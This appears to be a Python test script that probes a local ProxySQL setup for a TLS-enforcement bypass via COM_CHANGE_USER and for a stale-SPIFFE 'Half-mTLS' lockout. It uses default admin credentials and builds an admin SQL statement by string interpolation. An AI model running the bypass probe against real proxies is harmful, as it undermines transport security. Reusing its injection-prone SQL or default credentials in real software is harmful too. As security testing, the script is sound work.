import mysql.connector
from mysql.connector.errors import Error

HOST = "127.0.0.1"
PORT = 6033
ADMIN_PORT = 6032
DB = "appdb"


def print_proxysql_users(context_message):
    print(f"\n[PROXYSQL INTERNAL STATE] {context_message}")
    try:
        admin_conn = mysql.connector.connect(
            host=HOST, port=ADMIN_PORT, user="radmin", password="radmin"
        )
        admin_cursor = admin_conn.cursor()
        admin_cursor.execute(
            "SELECT username, active, use_ssl, attributes FROM mysql_users"
        )
        rows = admin_cursor.fetchall()

        print(f"{'username':<15} | {'active':<6} | {'use_ssl':<7} | {'attributes'}")
        print("-" * 100)
        for row in rows:
            attr = row[3] if row[3] else "NULL"
            print(f"{row[0]:<15} | {row[1]:<6} | {row[2]:<7} | {attr}")
        print("-" * 100 + "\n")

        admin_conn.close()
    except Error as e:
        print(f"Failed to fetch ProxySQL state: {e}\n")


def print_conn_state(cursor, prefix="Connection State"):
    cursor.execute("SELECT USER(), CURRENT_USER(), CONNECTION_ID()")
    user, current_user, conn_id = cursor.fetchone()
    print(
        f"[{prefix}] Client User: {user:<20} | Auth Matched: {current_user:<15} | Conn ID: {conn_id}"
    )


def get_cipher(conn):
    try:
        return conn._cmysql.get_ssl_cipher()
    except (AttributeError, TypeError):
        return None


def check_frontend_ssl(conn, label="Connection"):
    cipher = get_cipher(conn)
    if cipher:
        print(f"[{label}] Frontend TLS: YES (cipher={cipher})")
    else:
        print(f"[{label}] Frontend TLS: NO (plaintext)")


def ensure_user_ssl(username, use_ssl_value):
    admin_conn = mysql.connector.connect(
        host=HOST, port=ADMIN_PORT, user="radmin", password="radmin"
    )
    admin_cursor = admin_conn.cursor()
    admin_cursor.execute(
        f"UPDATE mysql_users SET use_ssl={use_ssl_value} WHERE username='{username}'"
    )
    admin_cursor.execute("LOAD MYSQL USERS TO RUNTIME")
    admin_conn.close()


def test_plaintext_to_ssl():
    print("=========================================================================")
    print("--- TEST 1: Plaintext Socket to SSL User (COM_CHANGE_USER Bypass) ---")
    print("=========================================================================")
    print("[EXPLAIN] ProxySQL enforces SSL for 'user_with_ssl' (use_ssl=1).")
    print("[EXPLAIN] We attempt to bypass this by connecting as a non-SSL user first,")
    print("[EXPLAIN] then switching identities via COM_CHANGE_USER on the same socket.")

    # 1A. Opportunistic TLS (ssl_disabled=False)
    print_proxysql_users("Before [1A] Opportunistic TLS")
    print("[ACTION]  Connecting as 'user_no_ssl' with ssl_disabled=False...")
    try:
        conn_opp = mysql.connector.connect(
            host=HOST, port=PORT, database=DB,
            user="user_no_ssl", password="pass_no_ssl",
            ssl_disabled=False,
        )
        cursor_opp = conn_opp.cursor()
        check_frontend_ssl(conn_opp, "1A Initial")

        print("\n[ACTION]  Sending COM_CHANGE_USER to pivot into 'user_with_ssl'...")
        try:
            conn_opp.cmd_change_user("user_with_ssl", "pass_with_ssl", DB)
            print_conn_state(cursor_opp, "1A After Pivot")
            check_frontend_ssl(conn_opp, "1A Pivot")

            cipher = get_cipher(conn_opp)
            if cipher:
                print("[RESULT]  Pivot succeeded because TLS was already active.")
                print("[RESULT]  This is NOT a bypass - correct behavior.")
            else:
                print("[RESULT]  Pivot succeeded but socket appears plaintext.")
                print("[WARN]   This would be a bypass!")
        except Error as e:
            print(f"[RESULT]  FAILED: {e}")
        conn_opp.close()
    except Error as e:
        print(f"Connection error: {e}")

    # 1B. Forced Plaintext (The True Bypass Attempt)
    print_proxysql_users("Before [1B] Forced Plaintext")
    print("[ACTION]  Connecting as 'user_no_ssl' with ssl_disabled=True...")
    try:
        conn_plain = mysql.connector.connect(
            host=HOST, port=PORT, database=DB,
            user="user_no_ssl", password="pass_no_ssl",
            ssl_disabled=True,
        )
        cursor_plain = conn_plain.cursor()
        check_frontend_ssl(conn_plain, "1B Initial")

        print("\n[ACTION]  Sending COM_CHANGE_USER to pivot into 'user_with_ssl'...")
        try:
            conn_plain.cmd_change_user("user_with_ssl", "pass_with_ssl", DB)
            print_conn_state(cursor_plain, "1B After Pivot")
            check_frontend_ssl(conn_plain, "1B Pivot")
            print("\n[VULN]    !!! BYPASS SUCCESSFUL !!!")
            print("[VULN]    ProxySQL allowed COM_CHANGE_USER to an SSL-enforced")
            print("[VULN]    user over a confirmed plaintext socket.")
        except Error as e:
            print(f"\n[RESULT]  Pivot BLOCKED: {e}")
            print("[RESULT]  ProxySQL correctly enforces SSL on COM_CHANGE_USER.")
        conn_plain.close()
    except Error as e:
        print(f"Connection error: {e}")

    # Baseline: Direct plaintext to user_with_ssl
    print_proxysql_users("Before [BASELINE] Direct Plaintext")
    print("\n[ACTION]  Attempting direct plaintext connection to 'user_with_ssl'...")
    try:
        conn = mysql.connector.connect(
            host=HOST, port=PORT, database=DB,
            user="user_with_ssl", password="pass_with_ssl",
            ssl_disabled=True,
        )
        print("[FAIL]    Connection succeeded without SSL!")
        conn.close()
    except Error as e:
        print(f"[RESULT]  ProxySQL blocked it: {e}")

    # Happy Path: Direct connection with SSL + Certs
    print_proxysql_users("Before [HAPPY] Secure Connection")
    print("\n[ACTION]  Connecting to 'user_with_ssl' with TLS...")
    try:
        conn_ssl = mysql.connector.connect(
            host=HOST, port=PORT, database=DB,
            user="user_with_ssl", password="pass_with_ssl",
            ssl_ca="certs/ca.pem",
            ssl_cert="certs/client-standard-cert.pem",
            ssl_key="certs/client-standard-key.pem",
            ssl_disabled=False,
        )
        print("[RESULT]  SUCCESS: Connected securely!")
        print_conn_state(conn_ssl.cursor(), "Happy Path")
        check_frontend_ssl(conn_ssl, "Happy Path")
        conn_ssl.close()
    except Error as e:
        print(f"[FAIL]    Happy Path Issue: {e}")


def test_half_mtls_state():
    print("\n=========================================================================")
    print("--- TEST 2: Half-mTLS State (Stale SPIFFE Rule) ---")
    print("=========================================================================")
    print("[EXPLAIN] ProxySQL enforces SPIFFE client certs for 'spiffe_user'.")
    print("[EXPLAIN] If an admin disables use_ssl but leaves the SPIFFE identity,")
    print("[EXPLAIN] the user gets stuck in a broken 'Half-mTLS' state.")

    # 1. Happy Path
    print_proxysql_users("Before SPIFFE Happy Path")
    print("[ACTION]  Connecting as 'spiffe_user' with a valid SPIFFE cert...")
    try:
        happy_conn = mysql.connector.connect(
            host=HOST, port=PORT, database=DB,
            user="spiffe_user", password="spiffe_password",
            ssl_ca="certs/ca.pem",
            ssl_cert="certs/client-spiffe-cert.pem",
            ssl_key="certs/client-spiffe-key.pem",
            ssl_disabled=False,
        )
        print("[RESULT]  SUCCESS: Connected with SPIFFE validation!")
        print_conn_state(happy_conn.cursor(), "Happy Path")
        happy_conn.close()
    except Error as e:
        print(f"[FAIL]    Happy Path Issue: {e}")
        print("[EXPLAIN] Cannot verify the bug if the happy path fails.")
        return

    # 2. Disable use_ssl (simulate admin mistake)
    try:
        print("\n[ACTION]  Admin disables use_ssl for 'spiffe_user' (keeping SPIFFE)...")
        ensure_user_ssl("spiffe_user", 0)
    except Error as e:
        print(f"[FAIL]    Admin error: {e}")
        return

    # 3. Test the bug (use try/finally to guarantee revert)
    try:
        print_proxysql_users("After disabling SSL for spiffe_user")
        print("\n[ACTION]  Attempting plaintext connection as 'spiffe_user'...")
        try:
            conn = mysql.connector.connect(
                host=HOST, port=PORT, database=DB,
                user="spiffe_user", password="spiffe_password",
                ssl_disabled=True,
            )
            print("[FAIL]    Plaintext connection succeeded (bug fixed?).")
            print_conn_state(conn.cursor(), "Plaintext")
            conn.close()
        except Error as e:
            print(f"\n[RESULT]  Connection blocked: {e}")
            if "Access denied" in str(e):
                print("[VULN]    !!! HALF-mTLS BUG CONFIRMED !!!")
                print("[VULN]    Generic 'Access denied' even though use_ssl=0.")
                print("[VULN]    ProxySQL still tries to extract SPIFFE ID")
                print("[VULN]    from a plaintext connection.")
    finally:
        # 4. Revert (guaranteed idempotent)
        print("\n[ACTION]  Reverting spiffe_user back to use_ssl=1...")
        try:
            ensure_user_ssl("spiffe_user", 1)
            print("[RESULT]  Reverted.")
        except Error as e:
            print(f"[FAIL]    Revert error: {e}")


if __name__ == "__main__":
    test_plaintext_to_ssl()
    test_half_mtls_state()
